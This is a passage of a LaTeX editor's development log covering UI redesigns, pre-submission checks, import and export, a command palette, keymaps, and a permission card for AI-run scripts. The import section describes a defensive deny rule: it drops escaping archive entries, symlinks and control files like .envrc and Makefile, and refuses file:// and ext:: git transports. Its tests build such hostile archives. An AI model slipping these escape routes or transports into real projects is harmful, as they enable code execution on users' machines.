panel's and the viewing banner's *Download* of a version. Every one of
them goes through `download` in `chrome.tsx` now, and the link helper is
gone so nothing can reach for it again. A 500 or a 503 becomes a
sentence in the corner rather than a file called `download`. On the way, the
archive's walk stopped taking an atomic write's scratch file and stopped
failing whole when a listed file is gone by the time it is read, which
an open project, written under the walk every 120 ms, can do.

`e2e/specs/download.spec.ts` downloads from inside the project while
typing and with a build running, twice, and reads the archive's own
directory back to find the sources and no build output; and from the
list. `tests/api/test_download.py` deletes a listed file under the walk
and finds the archive whole without it, and a scratch file never taken.

### The rendering follows the caret, gently

The last half of behaving like the page. §28 records how the page
follows the caret after a build: both the agent's edits and the writer's
own typing move it, and one rule keeps it quiet, the move happens only
when the target is not already in front of the reader. The rendering
has no build to wait for, so it follows on the text's own cadence: when
the text changes and this keyboard typed within the grace `timing.ts`
keeps, the block holding the caret's line is scrolled into view if it
is off screen, and left alone if it is not. The effect depends on the
text and never on the caret, which is what makes the anti-jump cases
hold: a click into the editor after reading the rendering changes no
text and moves nothing, and a collaborator's or the agent's change
arrives with nobody typing here and moves nothing. No flash, because
nothing was built. `e2e/specs/markdown-preview.spec.ts` types at the end
of an eighty-paragraph file and finds the last block in view, then
scrolls back to the top, clicks into the editor without typing, and
finds the pane where it was left.

### The file and its rendering close each other

Reported by the writer the day the Markdown half shipped: closing the
`.md` left its rendering on the preview strip, and closing the rendering
left the file open. §34 settled the rule for documents, a preview that
stops closes its files and a followed document leaves with its last
file, and §39 had given the Markdown tab the script tab's rule instead,
staying closed while the file is typed in. A run's output is a thing of
its own and can be read after its script is closed; a rendering is the
file and nothing else, so the two are one thing to close, in either
direction. Closing the file's tab takes the rendering with it, and
closing the rendering closes the file, both through `closeMany` in one
store write, so the file lands on the reopen stack and `Mod-Alt-Shift-T`
brings the pair back, the follow effect restoring the rendering as the
file returns. The script tab keeps its own rule. The spec closes each
side in turn and finds the other gone, and reopens the file to find
both back.

## 44. The projects screen is a rail beside the list

The writer asked for a revamp with one complaint and two requests: with a
long list, starting something, joining something, the settings and the
update were all out of reach, and the list wanted a search box and a way
to sort it. Five layouts were drawn as a page they could try, each with
the list as the only thing that scrolls and everything else pinned
around it, and they chose the rail.

### The rail, the list, the footer

Everything on the screen that is not a project stands in a 280px column
on the left: the brand and its strapline, the writing agent, the three
ways in as a stacked group where the chosen one unfolds its fields in
place (revised below: they are a row of tiles now, with the form under
them), and at the foot, help and the cog. The update and the password
nudge are a footer under that column. The list has a header with the
heading and count, the search box, the sort and Back, and the rows
scroll under it. Nothing else moves. `e2e/specs/projects-list.spec.ts`
seeds thirty projects, scrolls the list to its end, and finds the brand,
Start something new, Join, the search, the sort and the cog all still in
the window, with the screen's own scroll height equal to its client
height.

Placement is by grid area rather than by document order, and the order
is chosen for the screen's readers: rail, then list, then footer. The
footer's nudge says "your projects", and nineteen browser specs wait for
the first thing on the screen that says Projects, which has to be the
heading. The heading is drawn once the list has answered, so that wait
keeps the timing it had. The cog, the help button and the agent control
exist exactly once in the DOM; the phone layout below moves them with the
grid rather than drawing a second set.

Every pane is `--surface`. The proofing grey, `--surround`, is darker than
the three surfaces the inks were certified against, and the sheet had
been the one place small dim text sat on it, corrected by a rule that
stepped `--ink-3` up to `--ink-2` on that plane. The rail, the list and
the footer sit on a surface, the grey shows only as the seams between
them, and that rule went with the sheet. The axe pass in
`e2e/specs/a11y.spec.ts` over this screen is the check.

The rail is 280 and not narrower because the join invite box, the
template chooser, the offer card's outcome words and the update footer's
wrapped lines all need it. The update footer's lines wrap now, since a
message, a button and Report a problem on one line are wider than the
rail; nothing is carried off a line, it drops under. The spec that guarded
Try again against a long reason from git used to assert the row's height,
which wrapping makes false, and asserts its premise instead: the message
is one truncated line with the whole of it in its title, and both
controls are inside the footer's box.

The ways in scroll inside the rail on a window too short for them, and
the footer keeps to half the window, so a 260px-tall window, which
`e2e/specs/menus-on-screen.spec.ts` opens, still reaches the first row.
The help card, which used to be drawn absolutely under its button, is
placed by `placeMenu` from `frontend/src/place-menu.ts`, the file menu's
road: under the button when there is room, above it when there is none,
and pushed in from the edges, so at the foot of a rail it opens upward
and on a phone it stays on the screen.

An error that belongs to a row, a PDF that did not typeset or a remove
the server refused, is said above the rows rather than under the form in
the rail, where it read as an error about starting something. The form's
own error stays under the chosen way in and clears when another is
chosen. The join offer card is drawn after the third way in, so it sits
under Join whatever is chosen: a rejoin from a row produces an offer
while the chosen way in is still Start something new.

### The ways in are tiles

The writer's first sight of the rail turned up the one thing the
mockups had not shown with a form open: with Start something new
unfolded in place, Point at a folder and Join a shared project sat
under its Create button and read as its children, and a text label with
a rule on its left did not say "press me". Five variants were drawn as a
page they could try, cards, a segmented switch, an accordion, tiles, and
a button column with the form under it, and they chose the tiles. The
three ways in are one row of icon tiles, a plus, a folder and a link,
each with one word under it, the chosen one filled in the hint wash and
a closed one lifting its border and its word to the hint colour under
the pointer; the form for the chosen one is under the row, so it is
never between the three. The rules are plain CSS under `.nx-way-tile`,
because the chosen state travels as `aria-pressed` and a utility cannot
see it.

The word on the tile is short so three fit across the rail, and the
button's name is the whole phrase, through `aria-label`: a screen reader
hears "Start something new", every spec that finds the buttons by name
still does, and the visible word is contained in the name, which is
what label-in-name asks. The phone drawer needs nothing; the same row
sits across it. `e2e/specs/projects-form.spec.ts` finds the three on one
row, each under 90px wide, the chosen one pressed and the form below the
row's bottom whichever is chosen, and a hovered tile's border in the
hint colour.

### Search and sort

The search box is on the header whatever the count. The rule that
showed it at six projects, and the constant that carried the number, are
gone: a control that appears once the list is long is one nobody has
learned by the time they need it. `/` reaches it from anywhere on the
screen that is not a field.

The sort is a select with two choices, last opened and name. Last opened
is the order the server already answers in (two opened in the same
moment, which a seeded or hand-written registry can hold, come by name
and then by path since the backlog close-out, so the order is a function
of the entries alone), and `sortProjects` in
`frontend/src/project-filter.ts` hands that array back untouched, so
every row keeps its identity; name is a sorted copy through one
`Intl.Collator` with case folded, accents ignored and digits read as
numbers, so `chapter-3` sits before `chapter-10`, with the path as the tie
break. The rows carry when a project was last opened, which is what the
registry records; a sort by when it was last edited would need the server
to learn that first, and was not asked for. `visibleProjects` filters and
then sorts, and the arrow keys, Enter and Down from the search box all
walk that one list. The choice is kept per browser under
`nexttex.projects.sort`, through the same guarded `localStorage` helpers
the appearance settings use, now exported from `frontend/src/appearance.ts`
rather than copied; a stored value that is not a known key is the
default. The spec sorts by name, reloads and finds the order kept, and
walks the sorted rows with the arrows. (Since the backlog close-out every
per-browser choice goes through those two helpers or through
`remember.ts`: seven panes had carried a copy of the try/catch and two,
the git panel and the page pane, had none, the page pane reading its
mode and zoom bare inside `useState`, so a storage that throws, which a
private window or a blocked site does, took the pane down on mount.
`stored-guard.test.ts` reads the source and names any file that reaches
`localStorage` on its own.)

### A phone

Below 720 shell pixels, `BREAKPOINTS.phone` in `frontend/src/layout.ts`,
the rail is a strip along the top with the brand, a New button, help and
the cog, and the ways in are hidden until New opens them as a drawer from
the bottom of the screen, a dialog that `useDismiss` handles: focus goes
in, Tab wraps, Escape and a press outside close it and focus returns to
New. The breakpoint is judged from `viewportWidth()` and carried as a
`data-phone` attribute rather than as a media query, because the
interface size is a `zoom` on the root and a media query would judge the
window instead of the shell; the number is `MIN_SHELL`, the width at
which the editor stops claiming to be a layout, and the two are declared
equal on purpose. A rejoin on a phone opens the drawer when its offer
arrives, since a card arriving into a closed drawer would wait there
unseen; `e2e/specs/moved-project.spec.ts` plays a rejoin back at 390px
and finds the card in the open drawer.

### Browse

Asked for mid-run, in these words: a Browse button for "where", so the
folder is chosen visually rather than typed. A browser's own folder
dialog cannot serve, because what it hands back is files and never a
path on the server's disk, and the server's disk is the one that
matters. So the button opens a card that walks that disk, the papers
chooser's walk with a different footer. The walk itself, the path box,
the row that goes up and the folders under the one being looked at, is
`frontend/src/panes/FolderBrowser.tsx` now, taken out of
`PapersChooser.tsx` so the two have one copy; the chooser keeps its PDF
counts and its Read button around it, and asks `/api/browse` not to count
PDFs for the picker, since that opens every child of home.

What choosing means depends on the way in, and the footer says so.
Pointing at a folder means that folder, since it already holds the
project: "Use this folder". Starting something new or joining needs a
folder that does not exist yet, so the picked one is the parent and the
project's own folder goes under it: "Put it in here" fills the field with
the folder and a name made from the title, lower-cased and hyphenated,
and when there is no title yet, or the project is somebody else's and
has no title here, with the folder and a trailing slash, the field
focused and the caret at its end for the writer to finish. The
arithmetic is `projectFolderFor` in `frontend/src/project-path.ts`,
tested without a browser, as is `startingPoints`, which opens the walk
on what the field says when that is a folder, on its parent when it
names one not yet made, and on home otherwise.

The card is placed by `placeMenu` from the button, and measured again
when the listing lands: it is a heading and a footer until then, and a
placement made at that height put the folders below the bottom of a
phone once they arrived. Escape closes the card and only the card; on a
phone it stands inside the drawer, which is itself a dialog listening
on the window, so the card stops the key. `e2e/specs/projects-form.spec.ts`
browses into a seeded folder and creates a project under it, finds the
trailing slash and the caret with no title, opens an existing folder
through the picker, and on a phone finds the card inside the window and
the drawer still open after Escape.

## 45. The second roadmap run: the checks

The roadmap's second run, worked in September 2026, took eight items in
three pushes; this section is the first push, the two checks. Each
subsection says what the writer gets, why it is shaped that way, and the
tests that hold it.

### Before you submit

The drawer says what stops a build. What a venue sends back is mostly
what does not: a `\today` in the footer, a `% TODO` beside a number, a
`\todo` printed in the margin, two figures with one label, an entry in
the `.bib` nobody cites, a paragraph commented out in March and still
there, a figure pasted from a screenshot at 75 ppi, a font the reader's
machine has to guess at, and the author block on a paper the venue
reviews blind. Nearly every input already existed: the log parser has
carried the undefined keys, the overfull count and the page count since
the compile tool learned to report them, `rename` knows every reference
and cite family, and the vendored `.bib` reader knows each entry's line.
The check is one function over those, plus the two things a log cannot
say, which poppler's `pdffonts` and `pdfimages -list` answer in a table
each; the roadmap had named both, and both arrive with the `pdftotext`
the installer already names.

It is a panel in the rail's footer, between the papers and the context,
rather than rows in the drawer, because the drawer is a build's news and
this is a question asked on purpose: *Check* reads the last build and
the sources as they are now, the open documents winning over the disk
so a `\today` deleted a moment ago is gone from the list before the
flush. The findings are grouped by kind in the order a reviewer would
notice them, a page limit first and an unused label last, each group
with its count, each row with a severity bar the drawer's colours, its
message, and its place. A row with a file and a line jumps to it; a row
that came off the PDF has a page instead and turns the page, which is
what `PdfHandle.goTo` was for; a row with neither opens to its
explanation, the drawer's *What to do* shape. *Copy all* puts one line
per row on the clipboard, `file:line: message`, which is the mail to a
co-author. The header counts what was found and how many are errors,
and an open panel checks again when the page redraws, so the list
follows the build.

The two venue facts live in the panel because they are read there. A
page limit is typed into a field and *Blind review* is a switch, and both
go into `nexttex.toml` as `page_limit` and `blind` rather than into this
browser, because a co-author submitting from another machine needs the
same answers; the settings route accepts them beside the switches and
`project_changed` carries them. A limit of zero is no limit and is not
written. A machine without poppler is told so in the panel before Check
is pressed, from `GET /api/tools`, and the report carries one row per
check that could not run rather than pretending it did. None of it
involves a model, which the roadmap asked for and which is why every
threshold is a number the row says: an image is flagged under 150 ppi
with its ppi in the message, an overfull box over five points, a
comment run at three lines and two hundred characters.

`tests/test_usage.py` reads every reference and cite family, comma lists
and optional arguments, a use in a comment ignored and `\nocite{*}`;
`tests/test_submit.py` reads the two poppler tables from outputs
captured on this machine, one from a PDF ghostscript re-distilled with
embedding off, and a typed `Type 1C` row so a type with a space in it
cannot shift the columns, gives every kind from a hand-written source,
and runs the real tools over a real build where they exist;
`tests/api/test_submit_route.py` reads a fixture log through the route,
sets the two facts and finds them in the file, and refuses a document
outside the project. `e2e/specs/submit.spec.ts` builds a document with
one of everything, presses Check, finds a row per kind, follows the
`\today` row to its line and the image row to its page, switches blind
review on and finds the author line, sets a limit under the count and
finds the row, and reads *Copy all* back off the clipboard.

### Bibliography checks while you type

A `.tex` file has had chktex rows in the drawer for as long as the
drawer has existed, and a `.bib` file, which is where a paper's worst
embarrassments live, had none. The roadmap item said the field rules
were the ones `nexttex/vendor/verify_bib.py` already applies; reading
the file found otherwise, since that script checks an entry against the
publisher's record for the DOI it names and knows nothing of which
fields an `@inproceedings` needs. The table is BibTeX's own, from the
manual, and it is new in `nexttex/bibcheck.py`. What is reused is that
script's parser, because it is the one `.bib` reader here that carries
an entry's line, and the drawer's rows need one.

The rows are the lint route's `.bib` case, so they arrive by the road
chktex's do and sit in the same drawer with the same Copy and the same
explanation under each: a key defined twice, at the second; a required
field missing or empty, naming the field; a year that is not four
digits, quoting what it is instead so "in press" and `\the\year` are
told apart from a typo; the same DOI under two keys, which is one paper
added twice; and, as an `info` row rather than a warning, an entry no
document cites, which BibTeX would leave out and which is only wrong if
the venue wants the file tidy. That last row is suppressed by a
`\nocite{*}` anywhere, since then every entry is wanted. chktex is asked
once, on open; the bibliography check is pure Python over the live text,
so it is asked again once the keystrokes settle, and a row that says a
field is missing leaves when the field is typed, which is what "while
you type" means and what the spec asserts without reopening the file.

Two completions came with it. `@` at the start of a line in a `.bib`
offers the entry types, and each is a snippet with the key first and the
type's required fields as tab stops in the order they are usually
written; a word at the start of a line inside an entry offers that
type's fields, required first, each landing with the caret inside its
braces. The TypeScript table mirrors the Python one and a test on each
side names the other's types, so they cannot drift apart silently.
`\bibliographystyle{` in a `.tex` file offers the styles this TeX has,
walked once per process from the trees `kpsewhich` names and carried on
the symbols payload the editor already refetches; the four every BibTeX
has stand in when there is no `kpsewhich`.

`tests/test_bibcheck.py` reads each rule, the book's author or editor,
the DOI prefix, and a type the table does not know; `tests/test_texstyles.py`
walks a made-up tree and falls back; `tests/api/test_lint_bib.py` asks
the route about a file with a document citing one of its entries, with
`\nocite{*}`, and with a path outside the project. `e2e/specs/bib-check.spec.ts`
opens a `.bib` with a duplicate key and an article with no journal, finds
both rows, types the journal in and finds that row gone, completes
`@inp` into an `@inproceedings` with its `booktitle`, and completes
`\bibliographystyle{pl` to `plain`.

## 46. The second roadmap run: in and out

The second push of the second roadmap run: a project coming in from
somewhere else, and a document going out in a format that is not PDF.

### Bring one from elsewhere

The projects rail had three ways in, and each began from nothing or from
a folder already here. A paper that exists somewhere else, a zip a
co-author mailed, the source arXiv keeps for a paper, a repository on
GitHub, had to be unpacked or cloned by hand into a folder first and
then pointed at. The roadmap item asked for the three ways to reach a
new project directly, and said nothing about how many tiles; the rail's
three tiles were chosen from five variants the writer was shown, so the
answer is one more tile in the same row, *Bring one from elsewhere*,
not three. Four fit: the visible word is short, the accessible name is
the whole phrase, and the grid simply has four columns.

Its form is one field and the folder. The field takes an arXiv id in
any of its spellings, bare or as an abs or pdf URL, or a git URL on a
transport that reaches a host; a *Choose a zip* button beside it fills
the same field with the file's name, and typing over the name means the
zip is no longer what is meant. What was typed decides the way, in the
browser before a request is made and again on the server with the same
patterns, and anything else is refused in a sentence that says what the
field takes. Browse works as it does for a new project: the picked
folder is the parent, and the project's own folder under it is named
from the id, the repository or the zip. The button says *Bring it* and
*Bringing…* while a clone runs.

What arrives is fenced the way an upload is, because a zip into a new
project is the same channel as a zip into an open one: an entry that
would leave the folder, a symlink, and every control path, `.git`,
`.claude`, `.nexttex`, a `latexmkrc`, a `Makefile`, an `.envrc`, is
left out, and the names are said in a notice inside the project once it
opens, since the projects screen is gone by then and a file the writer
sent and did not get is something to know. A single top-level folder is
stripped, so a zip made by zipping a folder is the folder. A clone
brings its `.git`, which is the one control directory this way in
accepts and the reason it is a clone rather than a download; the
reasoning in `project.py` about a cloned folder being somebody else's
already covers it, and the URL is held to `https`, `http`, `ssh`, `git`
and `user@host:`, so a path on this machine and git's `ext::` transport
are never handed to it. arXiv answers one of three things, and the
PDF-only submission is refused with a sentence rather than unpacked as
a project with nothing to edit. The fourth tile is not in the contrast
spec's list: that spec measures the project view, and the tile and the
field reuse the three tiles' and the other fields' own classes, whose
pairs the rail review measured.

`tests/test_arrive.py` builds archives with an escape, a symlink, every
control path, a single root, too many entries and a member that inflates
past the cap; reads the arXiv id in its spellings; hands `fetch_arxiv` a
tar, a single file and a PDF; and refuses `file://`, a bare path and
`ext::` as URLs. `tests/api/test_arrive_route.py` brings a zip, an id
through the seam and a URL through a stubbed git, and finds the folder
gone after a refusal. `tests/test_gitrepo.py` reads the clone's argv and
finds a real clone of a local bare repository refused by the transport
rule; a real clone of a public repository was run by hand during the
run. `e2e/specs/arrive.spec.ts` brings a zip through the tile and finds
the figure in the tree and the left-out names in the notice, serves a
tar.gz from a stand-in for arXiv that `NEXTTEX_ARXIV_BASE` names, and
finds nonsense refused in the form.

### Word, HTML and Markdown, when pandoc is here

A co-author who does not write LaTeX, a journal that wants a `.docx`, a
page for the group's site: the one conversion a paper needs on the way
out, and the first roadmap run left it because pandoc was not on this
machine. It is now, fetched into `~/.local` by hand as the plan said,
and the feature is shaped around its absence as much as its presence.
pandoc is an optional tool the way `pdftotext` is: the installer's
survey names it and the install line for this platform, NextTex never
installs it, and `GET /api/tools` says once per load whether it is
here. When it is, the download menu lists under each document's PDF row
three more, Word, HTML and Markdown, indented and named for what they
are with the suffix beside; when it is not, the menu says nothing about
them, because a row that can only fail is not offered and a menu that
grows a sentence about installing something is a settings sheet. (The
three are chips on the document's own row since the backlog close-out,
§48; the rule about their absence is unchanged.)

The conversion is the download route's `format`, since it is the same
gesture as the PDF: the document on the strip or any `.tex` that builds
on its own, converted in its own directory with the project root on the
resource path, every `.bib` handed over so a `\cite` comes out as a
reference, and HTML as one file with its images inside it so it can be
mailed. pandoc's own last line is what the corner says when it cannot,
which is usually a macro it does not know, and that is the sentence the
writer needs. The rows are in the download menu the contrast spec
already measures.

`tests/test_export.py` reads the argv for each format, the fake's file
and failure, and runs the real pandoc over a document with a citation
and a figure, finding `word/document.xml` in the `.docx`, the image as
a data URI in the HTML and the reference in the Markdown;
`tests/api/test_download.py` asks the route for all three through
`tests/fake_pandoc.py`, finds a 409 without pandoc, a 422 with its words
and a refusal for a document outside the project. `e2e/specs/export.spec.ts`
points a server at the fake and downloads a `.docx` from the third row,
then starts one with the seam unset and finds the rows absent.

## 47. The second roadmap run: editor and agent

The third push of the second roadmap run: what the hands do in the
source and the composer.

### A command palette, and one list behind the chords

The roadmap asked for one box that finds every action, setting and file
by typing, and said the chords in `keys.ts` and the settings sheet's
controls were the list. Neither was. `keys.ts` only spells a chord for
both keyboards; the chords themselves were literal `if` blocks in two
keydown effects in `App`, the Tutorial's Keyboard section was a second
list typed by hand, the README's table a third, and the README said the
settings sheet held the list when it was the Tutorial. So the palette's
first job was the list. `actions.ts` is it: one row per action with its
id, its label, its group and its chord, no handlers, so a test can walk
it. `App` dispatches every chord from that table now, the Tutorial
renders its Anywhere rows from it, and a vitest reads the README's
tables back and holds the Anywhere table to exactly the registry's
chords; `Mod-Enter`, which acts on the caret, is listed with the
source's own keys and the test knows that. The wrong sentence in the
README is fixed, and the README gains the palette's row.

`Mod-K` opens it, which is the chord every editor with a palette uses
and which neither CodeMirror nor the browser claims in a way a page
cannot take. It is fetched then, like the share sheet: most sessions
never open it. One box at the top of the window, one column of rows
under it with the group on the left, the label, and the chord on the
right where the action has one, in the app's furniture and its usual
dialog dismissal, Escape or a click outside. With nothing typed it
lists the actions and a few files; typing ranks everything as a
case-folded subsequence with a bonus for a word start and for a run of
letters, within each kind, so a setting is never buried under forty
chapters that share a letter with it. A setting is one row per value,
"Editor ground: warm", "Spelling: on", with the current one marked, so
choosing is one press and the row says what it will do; it goes through
`applyAppearance` as the sheet's own control would. A file opens in a
tab. The registry also carries actions with no chord, Build, the
settings sheet, the tutorial, the history, sharing, the two downloads
and the way back to the projects, so the palette reaches things a chord
never did. The settings sheet is its trigger's own state and the trigger
sits in whichever bar the layout draws, so the palette opens it by a
count the trigger watches rather than by a second sheet.

`actions.test.ts` reads `Mod` as Meta and Ctrl, a letter on the code
with Alt held, a chord refusing a modifier it does not name, the
brackets, the function keys and Enter, and the README round trip;
`palette-rank.test.ts` the ranking and the settings rows.
`e2e/specs/palette.spec.ts` opens the palette on `Mod-K`, chooses an
action, a setting and a file and finds each done, and presses three of
the chords the registry took over. The palette is in the contrast
spec's list.

### Vim and Emacs, loaded only when chosen

A keymap is a setting of the machine like spelling, chosen on the sheet
in a Keymap row with three positions, Default, Vim and Emacs, and kept
per browser; the palette lists the same three. Neither costs a session
that wants neither anything: the compartment that holds a keymap is
empty until one is chosen, and the two packages travel in a chunk of
their own that the editor fetches the first time it is asked, then
puts into the view, or takes out again when Default is chosen. Vim's
status line and Emacs's mode class are the signs it has arrived.

The one constraint is the one `docs/architecture.md` recorded before
either keymap existed: undo belongs to the document. Both packages bind
their undo to CodeMirror's own command, and a live editor has no
CodeMirror history for it to act on, so `u` and `C-/` would have been
dead keys; each is rebound, through the override its package offers, to
the commands that already answer Ctrl-Z, which undo what this keyboard
typed and never what a collaborator did. The sheet says so under the row
when a keymap is on, because a writer who knows Vim expects `u` to mean
Vim's undo and is owed the sentence about what it means here.

Two things were found on the way. The Emacs package's published build
installs its keys and its commands through calls its own bundler marked
as pure, and a production build takes the annotation at its word and
drops both, so the app as built had an Emacs mode with no keys in it
while every unit test, on the unminified source, passed; the file is
vendored under `frontend/src/vendor/` with the two annotations removed
and its licence at the top, since the CommonJS build carries no
annotation but importing it brings a second copy of CodeMirror. And
`Ctrl-K`, the palette's chord, is Emacs's kill to the end of the line,
which is why the app's keydown listener now yields to a key the editor
has already answered. That yielding found one chord the two had both
been answering: CodeMirror's default keymap binds `Mod-Enter` to a
blank line, so every `Ctrl-Enter` that ran a script or went to the page
had also put a blank line under the caret, and once the app yielded the
run stopped altogether. The editor's binding is left out of its keymap,
since the chord is the app's; `editor-chords.test.ts` presses it and
finds the document unchanged and the event unanswered, and presses
`Ctrl-Shift-F` as a keyboard reports it, with the capital, and finds the
editor's own find panel shut.

`editor-undo.test.ts` presses `u`, `Ctrl-r` and `C-/` on a document that
arrived from the socket and finds only what this keyboard typed undone
and `historyField` absent; `appearance.test.ts` reads the setting back.
`e2e/specs/keymaps.spec.ts` picks Vim, removes a line with `dd` and puts
it back with `u`, reloads and finds Vim still on; picks Emacs, kills a
line with `C-k`, finds the palette shut and `C-/` restoring the line;
and back on Default types `dd` as two letters.

**The status line was drawn over the sheet that switched it on.** The
writer chose Vim and the Vim status line appeared across the bottom of
the settings sheet, which was still open. CodeMirror gives its panels
`z-index: 300` in its base theme, for an editor taller than the box
that scrolls it, and nothing in NextTex isolates the editor, so that
number reached the page's own stacking context, where every menu is 40
and every sheet 50. The find panel had the same number and would have
done the same over any sheet while open; the Vim line, which is always
there once Vim is on, was the one that got noticed. `.cm-editor
.cm-panels` is now `z-index: 1`, enough to stay above the scroller
beside it and under everything the app draws over the editor.
`keymaps.spec.ts` opens the sheet over the Vim line and over the find
panel and asks the browser what is drawn on top at the panel's centre.

### Paste data as a table, paste an image as a figure

A spreadsheet's copy is tab-separated text and a `.csv` is
comma-separated, and either pasted into a chapter arrived as lines the
writer then retyped with ampersands; a screenshot on the clipboard
could be pasted onto the file list since the backlog run, but not into
the paragraph that was going to refer to it. Both are caught now before
CodeMirror's own paste, in a `.tex` buffer and never inside `verbatim`,
`lstlisting` or `minted`, where what was pasted is what was meant.

Text is a table when it has at least two lines, every line has the same
count of one delimiter, tab first, then comma, then semicolon, and at
least two columns; a quoted field with a comma inside stays one cell,
and a paragraph of prose with commas in it fails the same-count rule
and is pasted as text. The table is booktabs, `\toprule`, `\midrule`
and `\bottomrule`, the first row as its header, a column whose every
body cell is a number right-aligned, every cell escaped so `50%` and
`R&D` typeset as written, inside a `table` environment with an empty
caption and label; it is one transaction, so one undo removes it, and
the caret lands in the caption because that is what is typed next. An
image is saved as `figures/pasted-<stamp>.png` through the upload route
the tree's paste uses, keeping both when the name is taken, and a
`figure` environment with the `\includegraphics` is written for it when
the save answers, at the caret as it is then.

The first build of a pasted table in a document without booktabs fails
on `\toprule`, and the drawer said "find which package provides it";
the context line TeX echoes names the command, so the explanation now
names the package for the commands a paper pastes in before its
preamble loads them: booktabs, graphicx, siunitx, cleveref, natbib,
xcolor, hyperref and multirow. The summary card says the same.

`paste-table.test.ts` reads the delimiters, a quoted field, a prose
paragraph refused, the escaping and the alignment; `test_explain.py`
reads the package rules; `e2e/specs/paste.spec.ts` dispatches a paste
carrying tab-separated text and finds the table, the caret in the
caption and two undos taking it away, dispatches one inside `verbatim`
and finds no table, and dispatches one carrying a PNG and finds the file
under `figures/` and the figure environment naming it.

### Slash commands, and a review in two voices

The selection toolbar has verbs, and each is a sentence that seeds the
composer; a writer who wanted the same three paragraphs of instruction
every time retyped them or kept them in a note. A reusable prompt is
now a Markdown file whose stem is its name, a hyphen in the stem read as
a space when typed, so `review-friendly.md` is `/review friendly`. Two
ship inside NextTex, so a fresh project has them with no file: `/review
friendly` reads the selected passage, or the document, as a mentor
would, what works first and then what to strengthen, in order of how
much it would help, kindly and concretely; `/review critical` reads it
as the second reviewer, the claims that are not supported, the weakest
section, what a rejection letter would say. The roadmap put a project's
own beside the distilled style guide in the context directory, and that
is under `.nexttex/`, which is never synced and which `initialise`
writes into `.gitignore`, so nothing there could be shared through git,
which was the point. They live in `prompts/` at the project root, where
git sees them, and one with a built-in's stem replaces it.

The composer draws the menu above the box while the draft is one line
that starts with `/` and could still mean something, each row the
prompt's spoken name and its first line as the hint, a project's own
marked as this project's. The arrow keys move, Enter or Tab fills the
name into the draft, and the writer sends on their own, which is the
selection toolbar's rule: nothing goes to the model because a menu was
open. A draft that is exactly a prompt's name gets no menu, so the next
Enter sends it; Escape puts the menu away until the draft changes; a
`/` that matches nothing sends as typed. The expansion happens once, on
the server, before either provider sees the turn: the file's text, and
`The writer adds:` with whatever followed the name, go ahead of the
selection in the context, and the prompt itself stays the line that was
typed, so the transcript shows `/review friendly the abstract only` and
not the instruction. The Context panel lists the prompts under what the
agent reads, since that is what they are, and *Copy to project* on a
built-in writes `prompts/<name>.md` through the ordinary save, so the
copy has a version, the tree hears about it, and the group can edit
their own review and commit it with the paper; a name the project
already has is refused rather than overwritten.

`test_prompts.py` reads the two built-ins, the override, a name typed
with a space and with a hyphen, the note, no match, and a stem that is a
path never read; `test_prompts_routes.py` reads the list, the copy and
its 409, a hostile name, and the scripted agent's record of a
`/review critical` turn: the prompt as typed, the context carrying the
file's text and the note. `slash-prompts.test.ts` reads the matcher.
`e2e/specs/slash-commands.spec.ts` types `/rev`, finds two rows, arrows
to the friendly one, presses Enter and finds the name filled in and
nothing sent, adds a note and sends, and reads the answer of the
scripted agent's `context` script, which says back what the turn was
given, so the file's text and the note are on screen; a second test
copies a built-in from the Context panel and finds the file in the tree
and the row marked as the project's.

## 48. The backlog close-out

A run through every line of `TRACKER.md`'s backlog after 2.16.0, with
four things the writer raised while the plan was being drawn. What
changed for the writer is here; what changed for the tests and the
mechanics is in `docs/testing.md` and `docs/architecture.md`.

### The download menu is a table: one row per document, one chip per format

The writer asked for the menu to show the whole project and each
document once, with the format chosen on the row, "a fly out to select
the format, or inline buttons for each format like on the projects
screen", and left the choice to this end. The menu had been a column
since §33: "Whole project .zip", then each document's `.pdf` row and,
on a machine with pandoc, three indented rows under it for Word, HTML
and Markdown. Twenty resume variants with pandoc was eighty rows, and a
document's four rows read as four things when they are one thing in
four shapes.

Chips, not a fly-out. A second popup hung off a row needs hover intent
so it does not open on the way past, a place of its own that stays in
the window, a right-arrow path into it and back, and a line of its own
in the contrast spec, all for a choice that is one word wide; and the
projects screen already draws the answer, `Zip` and `PDF` sitting at the
end of a row. So the menu is a grid. The first row says "Whole project"
and ends in `.zip`. Each document's row is its stem, truncating with the
full path in its title, and then `.pdf`, and with pandoc `.docx` `.html`
`.md` after it, each chip named for what lands in the folder with the
format's name in its title. A chip is a control and is drawn as one,
ink-2 at rest and a wash on hover, the projects screen's buttons
exactly, and the contrast spec measures it as one. The menu widened
from 232 to 320 so a stem keeps a readable run beside four chips.

The arrows walk the grid rather than the column, `walkGrid` in
`menu-keys.ts` beside `walkMenu`: Down and Up move between rows and
land on the chip at the same position, or the row's last chip when it
is shorter, wrapping at the ends; Left and Right move along a row and
stop at its ends, so Right on a `.pdf` with no pandoc goes nowhere
rather than into the next document; Home and End are the first and last
row; Escape closes and puts focus back on the button; focus follows the
pointer as before. `menu-keys.test.ts` walks a three-row grid with one,
four and one chips; `toolbar.spec.ts` opens the menu over two documents
and walks it with the keyboard; `export.spec.ts` finds the three chips
on the document's own row and downloads a `.docx` from the first.

### The OpenAI provider draws figures, and asks first

The OpenAI provider had no script tools, and the tracker said why: it
put no card up at all, everything it could do was confined to the
project by construction, and a tool that runs Python needs the card
before it can have the tool. The card is the work, and it is done. The
three script tools are on its list now, `run_plot_script`, `run_script`
and `install_package`, named as the Claude agent's are without the
prefix, and each goes through a permission card before it runs: the
same card, with the same headline, the script itself as the detail, the
same consequence sentence, and at the middle position the same reason.
`nexttex/permission_gate.py` holds what the two providers' cards must
agree on, so the browser and the transcript cannot tell which provider
asked. Everything else on the OpenAI list is still confined by
construction and still asks about nothing.

**One rule for the project, whichever model proposed the script.** The
rule an "always" remembers is the digest of the code the card showed,
spelled the same way for both providers, and both read and write it in
the same `agent-settings.json` under the project's `.nexttex/`. So a
script allowed always under OpenAI runs without a card under Claude,
and the other way round, and the control's position carries across a
provider switch. That is deliberate: the rule is about the code the
writer approved, not about the model that wrote it, and a fence that
forgot every answer on a provider change would teach the writer to
press "always" twice. What it does not do is widen: a different script
is a different digest and asks again, on either provider, and the
middle position still asks about a script and a package install on
both, since a script can do anything Python can.

**The control has three positions here too.** The bolt beside the
composer, which the interface draws only for an agent that has
`set_mode`, appears for this provider now; `all` records a script run as
settled rather than asking, `project` and `ask` both ask. And the turn's
clock stops while a card is open: the provider had one five-minute
ceiling around the whole turn, so a card left open for six minutes ended
the turn under the writer's cursor although a card may wait ten.
`tests/test_openai_agent.py` puts a card up before a run, refuses on
deny with the script never run, remembers an always on disk and skips
